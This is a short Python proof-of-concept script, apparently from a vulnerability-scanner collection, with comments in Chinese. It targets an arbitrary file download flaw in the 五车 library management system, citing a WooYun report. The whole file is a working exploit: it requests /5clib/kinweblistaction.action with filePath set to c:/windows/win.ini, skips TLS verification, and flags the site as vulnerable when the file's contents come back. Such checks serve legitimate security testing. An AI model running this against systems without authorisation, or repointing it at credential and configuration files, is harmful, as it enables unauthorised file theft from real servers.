#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 五车图书管系统任意下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0128591
author: Lucifer
description: /5clib/kinweblistaction.action文件中,参数filePath未过滤存在任意文件下载。
'''
import sys
import requests
import warnings
from termcolor import cprint

class clib_kinweblistaction_download_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/5clib/kinweblistaction.action?actionName=down&filePath=c:/windows/win.ini"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"support" in req.text and r"MPEGVideo" in req.text:
                cprint("[+]存在五车图书管系统任意下载漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = clib_kinweblistaction_download_BaseVerify(sys.argv[1])
    testVuln.run()